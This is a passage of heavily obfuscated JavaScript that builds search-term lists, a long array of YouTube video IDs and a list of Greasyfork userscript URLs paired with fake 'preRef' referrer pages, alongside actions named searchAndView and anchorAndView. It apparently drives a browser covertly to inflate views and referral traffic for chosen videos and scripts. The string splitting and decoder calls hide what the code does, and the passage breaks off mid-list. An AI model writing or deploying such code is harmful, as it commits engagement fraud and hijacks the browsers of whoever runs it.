searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + W(0x15) + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + W(0x18) + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x3 * 0xa1 + -0x2083 + 0x2270)), searchTerms['push']([X(0x1c) + 'spyder']['repeatExte' + 'nd'](-0x27 * 0x71 + 0x27 * 0x8f + -0x74 * 0xa)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x33c + 0x345 * 0x3 + 0x6 * -0x22c);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    Y(0x1f, 'Avdr') + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    W(0x11) + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    W(0x1e) + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    W(0xe) + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    X(0x4) + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    W(0xf) + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + X(0x10) + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + W(0x9)
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + W(0x1b) + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + Y(0x3, 'lObp') + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
